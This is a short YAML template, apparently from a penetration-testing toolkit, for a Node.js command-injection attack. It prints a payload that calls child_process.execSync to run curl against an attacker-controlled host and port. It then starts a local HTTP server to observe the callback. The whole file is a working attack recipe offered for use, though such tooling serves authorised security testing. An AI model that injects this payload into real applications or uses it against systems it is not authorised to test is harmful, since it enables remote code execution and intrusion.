  filename: nodejs-command-injection.yaml
  tags:
  - web
  created: '2025-03-29'
  author: '@anakles'
content: "mkdir -p packstation/outbound; \\\necho '================================================================';\
  \ \\\necho '                       -----Application------                      \
  \   '; \\\necho 'Deliver payload: require(\"child_process\").execSync(\"curl http://{{\
  \ attacker_ip }}:{{ delivery_outbound_port }}/callback\");'; \\\necho '        \
  \               -----Linux------                         '; \\\necho 'Observe the\
  \ callback below:                                     '; \\\necho '================================================================';\
  \ \\\n python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{\
  \ delivery_outbound_port }} -d packstation/outbound\n"
